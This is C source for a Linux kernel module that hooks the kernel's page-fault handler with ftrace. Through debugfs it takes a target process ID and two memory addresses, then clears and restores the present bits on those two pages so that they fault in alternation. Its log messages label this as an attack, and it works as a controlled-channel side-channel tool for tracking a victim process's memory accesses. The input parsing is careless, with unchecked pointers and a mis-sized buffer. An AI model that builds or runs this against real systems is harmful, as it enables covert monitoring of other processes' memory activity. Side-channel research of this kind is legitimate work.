#define pr_fmt(fmt) "ftrace_hook: " fmt

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#include <linux/sched.h>

#include <linux/string.h>

// debugfs
#include <linux/debugfs.h>
#include <linux/delay.h>

// pteditor
#include "pteditor.h"
bool mm_is_locked_hook = false;
ptedit_entry_t vm_user;
/** Page is present */
#define PTEDIT_PAGE_BIT_CLR_PRESENT 0xfffffffffffffffe
#define PTEDIT_PAGE_BIT_SET_PRESENT 0x0000000000000001

//WL:
pid_t target_pid;
unsigned long target_addr1;
unsigned long target_addr2;
bool present_flag1 = false;
bool present_flag2 = false;

#define LEN_DBG_PIDS_BUF 1024
static char dbg_pids_buf[LEN_DBG_PIDS_BUF];

#define LEN_DBG_ADDR_BUF 1024
static char dbg_addrs_buf[LEN_DBG_PIDS_BUF];

// static inline void my_flush_tlb_singlepage(unsigned long addr)
// {
//     asm volatile("invlpg (%0)" ::"r"(addr)
//                  : "memory");
// }

void set_present(pid_t pid, unsigned long address)
{
    ptedit_entry_t vm_user;
    vm_t vm;
    int rv;

    vm_user.vaddr = (size_t)address;
    vm.pid = pid;
    rv = resolve_vm(vm_user.vaddr, &vm, !mm_is_locked_hook);
    // printk("[hooking-setting] resolve_vm rv: %d\n", rv);

    vm_to_user(&vm_user, &vm);
    //WL: must pass the pid
    vm_user.pid = vm.pid;
    //WL: now we get the vm_user
    // printk("vm_user.pid: %d\n", vm_user.pid);

    vm_user.pte &= PTEDIT_PAGE_BIT_CLR_PRESENT;
    // printk("vm_user.pte: %lx\n", vm_user.pte);

    vm_user.valid = PTEDIT_VALID_MASK_PTE;
    rv = update_vm(&vm_user, !mm_is_locked_hook);
    // printk("[hooking-setting] update_vm rv: %d\n", rv);

    // struct task_struct *task;
    // struct mm_struct *mm;
    // // struct mmu_notifier_range range;
    // unsigned long *start;
    // unsigned long *end;
    // pte_t *pte = NULL;
    // pte_t tmp_pte;
    // pmd_t *pmd = NULL;
    // spinlock_t *ptl;
    // int ret;

    // /* rcu for task */
    // rcu_read_lock();
    // task = pid_task(find_vpid(pid), PIDTYPE_PID);
    // if (!task)
    //     return;

    // /* TODO: mm should be get/put */
    // mm = task->mm;
    // rcu_read_unlock();
    // if (!mm)
    //     return;

    // //WL: Linux 4.15's funtion sig:
    // /*
    // int follow_pte_pmd(struct mm_struct *mm, unsigned long address,
    // 		     unsigned long *start, unsigned long *end,
    // 		     pte_t **ptepp, pmd_t **pmdpp, spinlock_t **ptlp);
    // */
    // //WL: Linux 5.4's funtion sig:
    // // ret = follow_pte_pmd(mm, target_addr, &range, &pte, &pmd, &ptl);

    // ret = follow_pte_pmd(mm, target_addr, start, end, &pte, &pmd, &ptl);
    // if (ret)
    // {
    //     printk("[hooking-error] check present: ret is 0\n");
    //     return;
    // }

    // /* Manipulate the present bit of the page */
    // if (!pmd)
    // {
    //     printk("[hooking-setting] check present: %lx\n", target_addr);
    //     //pte_unmap(pte);
    //     tmp_pte = pte_clear_flags(*pte, _PAGE_PRESENT);
    //     printk("[hooking-setting] setting present...\n");
    //     set_pte(pte, tmp_pte);
    //     printk("[hooking-setting] flushing TLB...\n");
    //     my_flush_tlb_singlepage(target_addr);
    //     printk("[hooking-setting] unmapping pte...\n");
    //     if (pte)
    //         pte_unmap(pte);
    // }

    // //WL: why here? probably ptl locked at follow_pte_pmd()
    // spin_unlock(ptl);
}

static void reset_present(pid_t pid, unsigned long address)
{
    ptedit_entry_t vm_user;
    vm_t vm;
    int rv;

    vm_user.vaddr = (size_t)address;
    vm.pid = pid;
    rv = resolve_vm(vm_user.vaddr, &vm, !mm_is_locked_hook);
    printk("[hooking-resetting] resolve_vm rv: %d\n", rv);

    vm_to_user(&vm_user, &vm);
    vm_user.pid = vm.pid;
    //WL: now we get the vm_user

    vm_user.pte |= PTEDIT_PAGE_BIT_SET_PRESENT;
    vm_user.valid = PTEDIT_VALID_MASK_PTE;
    rv = update_vm(&vm_user, !mm_is_locked_hook);
    printk("[hooking-resetting] update_vm rv: %d\n", rv);

    // struct task_struct *task;
    // struct mm_struct *mm;
    // // struct page *page = NULL;
    // // unsigned long addr;
    // unsigned long *start;
    // unsigned long *end;
    // // pgd_t *pgd;
    // pte_t *pte, temp_pte;
    // // pud_t *pud;
    // pmd_t *pmd;
    // spinlock_t *ptl;
    // int ret;

    // /* rcu for task */
    // rcu_read_lock();
    // task = pid_task(find_vpid(pid), PIDTYPE_PID);
    // if (!task)
    //     return;

    // /* TODO: mm should be get/put */
    // mm = task->mm;
    // rcu_read_unlock();
    // if (!mm)
    //     return;

    // //struct vm_area_struct *vma = mm->mmap;
    // // vma = find_vma(mm, address);

    // printk("Page walking...\n");
    // ret = follow_pte_pmd(mm, address, start, end, &pte, &pmd, &ptl);

    // printk("Start to reset p bit\n");
    // struct vm_area_struct *vma;
    // //while(vma != NULL)
    // {
    //     for (addr = vma->vm_start; addr < vma->vm_end; addr += 0x1000)
    //     {
    //         pgd = pgd_offset(mm, addr);
    //         if (!(pgd_none(*pgd) || pgd_bad(*pgd)))
    //         {
    //             if (!(pud_none(*pud) || pud_bad(*pud)))
    //             {
    //                 pmd = pmd_offset(pud, addr);
    //                 if (!(pmd_none(*pmd) || pmd_bad(*pmd)))
    //                 {
    //                     ptep = pte_offset_map(pmd, addr);
    //                     if (ptep)
    //                     {
    //                         pte = *ptep;
    //                         temp_pte = pte_set_flags(temp_pte, _PAGE_PRESENT);
    //                         set_pte(ptep, temp_pte);
    //                         my_flush_tlb_singlepage(addr);
    //                     }
    //                     if (ptep)
    //                         pte_unmap(ptep);
    //                     //// up_write(&mm->mmap_sem);
    //                 }
    //             }
    //         }
    //     }
    // }
    // if (!pmd)
    // {
    //     printk("[hooking-resetting] reset pte: %lx\n", address);
    //     temp_pte = pte_set_flags(temp_pte, _PAGE_PRESENT);
    //     printk("[hooking-resetting] setting present...\n");
    //     set_pte(pte, temp_pte);
    //     printk("[hooking-resetting] flushing TLB...\n");
    //     my_flush_tlb_singlepage(address);
    //     printk("[hooking-resetting] unmapping pte...\n");
    //     if (pte)
    //         pte_unmap(pte);
    // }
}

//-----------------------

static ssize_t nr_chrs(const char *str, ssize_t len_str, const char chr)
{
    ssize_t ret, i;

    ret = 0;
    for (i = 0; i < len_str; i++)
    {
        if (str[i] == '\0')
            break;
        if (str[i] == chr)
            ret++;
    }

    return ret;
}

static const char *next_chr(const char *str, ssize_t len, const char chr)
{
    ssize_t i;

    for (i = 0; i < len; i++)
    {
        if (str[0] == '\0')
            break;
        if (str[0] == chr)
            break;
        str++;
    }

    return str;
}

static unsigned long *str_to_ints(const char *str, ssize_t len,
                                  ssize_t *nr_integers)
{
    unsigned long *list;
    ssize_t i;

    if (str == NULL || len == 0 || (str[0] < '0' || str[0] > '9'))
    {
        *nr_integers = 0;
        return NULL;
    }
    *nr_integers = nr_chrs(str, len, ' ') + 1;
    list = kmalloc_array(*nr_integers, sizeof(unsigned long), GFP_KERNEL);

    for (i = 0; i < *nr_integers; i++)
    {
        if (sscanf(str, "%lu ", &list[i]) != 1)
            break;
        str = next_chr(str, len, ' ') + 1;
    }

    return list;
}

static ssize_t debugfs_pids_write(struct file *file,
                                  const char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret;
    unsigned long *targets;
    ssize_t nr_targets;

    ret = simple_write_to_buffer(dbg_pids_buf, LEN_DBG_PIDS_BUF,
                                 ppos, buf, count);
    if (ret < 0)
        return ret;

    targets = str_to_ints(dbg_pids_buf, ret, &nr_targets);
    target_pid = (pid_t)(*targets);
    printk("[hooking-pid] pid is %d\n", target_pid);

    kfree(targets);

    if (target_pid != 0)
    {
        printk("Setting addr 1...\n");
        set_present(target_pid, target_addr1);
    }

    return ret;
}

// get addresses
static unsigned long *str_to_addr(const char *str, ssize_t len,
                                  ssize_t *nr_integers)
{
    unsigned long *list;
    ssize_t i;

    if (str == NULL || len == 0 || (str[0] < '0' || str[0] > '9'))
    {
        *nr_integers = 0;
        return NULL;
    }
    *nr_integers = nr_chrs(str, len, ' ') + 1;
    list = kmalloc_array(*nr_integers, sizeof(unsigned long), GFP_KERNEL);

    for (i = 0; i < *nr_integers; i++)
    {
        if (sscanf(str, "%lx ", &list[i]) != 1)
            break;
        str = next_chr(str, len, ' ') + 1;
    }

    return list;
}

static ssize_t debugfs_addr_write(struct file *file,
                                  const char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret;
    unsigned long *targets;
    ssize_t nr_targets;

    ret = simple_write_to_buffer(dbg_addrs_buf, LEN_DBG_ADDR_BUF,
                                 ppos, buf, count);
    if (ret < 0)
        return ret;

    targets = str_to_addr(dbg_addrs_buf, ret, &nr_targets);
    target_addr1 = targets[0];
    target_addr2 = targets[1];

    kfree(targets);

    printk("[hooking-debugfs] addr1 is %lx, addr2 is %lx\n", target_addr1, target_addr2);

    return ret;
}

static const struct file_operations pids_fops = {
    .owner = THIS_MODULE,
    .write = debugfs_pids_write,
};

static const struct file_operations addr_fops = {
    .owner = THIS_MODULE,
    .write = debugfs_addr_write,
};

static struct dentry *debugfs_root;

static int __init debugfs_init(void)
{
    // init target pid
    target_pid = 0;
    target_addr1 = 0;
    target_addr2 = 0;

    debugfs_root = debugfs_create_dir("middleware", NULL);
    if (!debugfs_root)
    {
        pr_err("[hooking-debugfs] failed to create debugfs\n");
        return -ENOMEM;
    }

    if (!debugfs_create_file("pids", 0600, debugfs_root, NULL, &pids_fops))
    {
        pr_err("[hooking-debugfs] failed to create pids file\n");
        return -ENOMEM;
    }

    if (!debugfs_create_file("addr", 0600, debugfs_root, NULL, &addr_fops))
    {
        pr_err("[hooking-debugfs] failed to create addr file\n");
        return -ENOMEM;
    }

    return 0;
}

static void __exit debugfs_exit(void)
{
    debugfs_remove_recursive(debugfs_root);
}

//------------------- hooking page fault handler ---------------------
MODULE_DESCRIPTION("module hooking __do_page_fault() via ftrace");
MODULE_AUTHOR("WL/ZL");
MODULE_LICENSE("GPL");

#define USE_FENTRY_OFFSET 0

struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        pr_debug("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long)hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
#endif
}

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    //备份原地址
    err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err)
    {
        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err)
    {
        pr_debug("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err)
    {
        pr_debug("unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
    {
        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0; i < count; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }

    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }

    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}

#ifndef CONFIG_X86_64
#error Currently only x86_64 architecture is supported
#endif

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// start hooking
bool check_target_process(pid_t pid)
{
    if (target_pid == 0)
    {
        // printk("[hooking-status] target pid is not set, stop hooking...");
        return false;
    }

    if (pid == target_pid)
        return true;
    else
        return false;
}

// __do_page_fault
static void (*real_do_page_fault)(
    struct pt_regs *regs, unsigned long code,
    unsigned long address);

static void fh_do_page_fault(
    struct pt_regs *regs, unsigned long code,
    unsigned long address)
{
    // judge if the process is target
    pid_t pid = task_pid_nr(current);
    if (!check_target_process(pid))
        real_do_page_fault(regs, code, address);
    else
    {
        pr_info("[hooking-attack] getting address - 0x%lx\n", address);
        if (address == target_addr1)
        {
            printk("Resetting addr 1...\n");
            //WL:
            reset_present(pid, address);

            // do real page fault handler
            real_do_page_fault(regs, code, address);
            printk("Setting addr 2...\n");
            set_present(pid, target_addr2);
        }
        if (address == target_addr2)
        {
            printk("Resetting addr 2...\n");
            //WL:
            reset_present(pid, address);

            // do real page fault handler
            real_do_page_fault(regs, code, address);
            printk("Setting addr 1...\n");
            set_present(pid, target_addr1);
        }
    }
}

/*
 * x86_64 kernels have a special naming convention for syscall entry points in newer kernels.
 * That's what you end up with if an architecture has 3 (three) ABIs for system calls.
 */
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

#define HOOK(_name, _function, _original) \
    {                                     \
        .name = SYSCALL_NAME(_name),      \
        .function = (_function),          \
        .original = (_original),          \
    }

static struct ftrace_hook demo_hooks[] = {
    HOOK("__do_page_fault", fh_do_page_fault, &real_do_page_fault),
};

extern void (*invalidate_tlb)(unsigned long);
extern void (*flush_tlb_mm_range_func)(struct mm_struct *, unsigned long, unsigned long, unsigned int, bool);
extern void (*native_write_cr4_func)(unsigned long);

static int fh_init(void)
{
    int err;

    // pteditor install
    int r;

#ifdef KPROBE_KALLSYMS_LOOKUP
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    if (!unlikely(kallsyms_lookup_name))
    {
        pr_alert("Could not retrieve kallsyms_lookup_name address\n");
        return -ENXIO;
    }
#endif

    flush_tlb_mm_range_func = (void *)kallsyms_lookup_name("flush_tlb_mm_range");
    if (!flush_tlb_mm_range_func)
    {
        pr_alert("Could not retrieve flush_tlb_mm_range function\n");
        return -ENXIO;
    }
    invalidate_tlb = invalidate_tlb_kernel;

#if defined(__i386__) || defined(__x86_64__)
    if (!cpu_feature_enabled(X86_FEATURE_INVPCID_SINGLE))
    {
        native_write_cr4_func = (void *)kallsyms_lookup_name("native_write_cr4");
        if (!native_write_cr4_func)
        {
            pr_alert("Could not retrieve native_write_cr4 function\n");
            return -ENXIO;
        }
    }
#endif

    // debugfs install
    debugfs_init();

    printk("[hooking-attack] Traversal module is working..\n");

    err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
    if (err)
        return err;
    pr_info("[hooking-attack] module loaded\n");
    return 0;
}
module_init(fh_init);

static void fh_exit(void)
{
    // debugfs exit
    debugfs_exit();

    fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));

    pr_info("[hooking-attack] module unloaded\n");
}
module_exit(fh_exit);
